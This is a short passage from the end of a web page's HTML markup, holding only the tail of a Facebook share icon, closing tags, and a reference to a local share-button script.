            <i class="iconfont icon-facebooksquare"></i>
          </a>
        
      </div>
    </div>
  
  
<script src="/js/shares.js"></script>



      </div>
    </div>
  </body>
</html>
